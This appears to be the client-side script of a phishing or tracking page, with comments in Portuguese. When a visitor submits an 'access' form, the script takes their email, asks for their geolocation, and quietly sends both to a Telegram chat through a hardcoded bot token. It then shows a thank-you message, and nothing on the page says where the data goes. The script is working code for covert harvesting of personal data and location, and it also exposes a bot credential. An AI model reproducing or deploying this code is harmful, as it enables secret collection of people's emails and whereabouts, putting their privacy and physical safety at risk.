// CONFIGURAÇÕES DO TELEGRAM
const token = '7842598726:AAF4S-pPYPkZSCX_TVCvn8pnbIUrm8txmho';
const chat_id = '-4645579995';

// Função para enviar mensagem ao Telegram
async function enviarMensagem(email, lat, lng) {
    const mensagem = `Novo acesso com localização:\n\nEmail: ${email}\nLatitude: ${lat}\nLongitude: ${lng}\n`;
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const params = new URLSearchParams({
        chat_id: chat_id,
        text: mensagem
    });

    try {
        const response = await fetch(`${url}?${params}`, {
            method: 'GET'
        });
        const data = await response.json();
        console.log(data);
    } catch (error) {
        console.error('Erro ao enviar mensagem:', error);
    }
}

// Função para obter a localização do usuário
function obterLocalizacao(callback) {
    if (navigator.geolocation) {
        if (confirm("Permitir que o site acesse sua localização?")) {
            navigator.geolocation.getCurrentPosition((position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                callback(lat, lng);
            }, (error) => {
                console.error('Erro ao obter localização:', error);
                alert('Não foi possível obter sua localização. Por favor, insira manualmente.');
                callback('desconhecido', 'desconhecido'); // Chama o callback com valores desconhecidos
            });
        } else {
            alert("Você não permitiu que o site acesse sua localização.");
            callback('desconhecido', 'desconhecido'); // Chama o callback com valores desconhecidos
        }
    } else {
        alert('Geolocalização não é suportada por este navegador.');
        callback('desconhecido', 'desconhecido'); // Chama o callback com valores desconhecidos
    }
}
// Adiciona um listener para o evento de envio do formulário
document.getElementById('acessoForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Impede o envio padrão do formulário

    const email = document.getElementById('email').value || 'não informado';

    obterLocalizacao((lat, lng) => {
        enviarMensagem(email, lat, lng);

        // Exibe mensagem de agradecimento
        document.getElementById('mensagem').innerHTML = "<h3>Obrigado! Seus dados foram recebidos.</h3>";
    });
});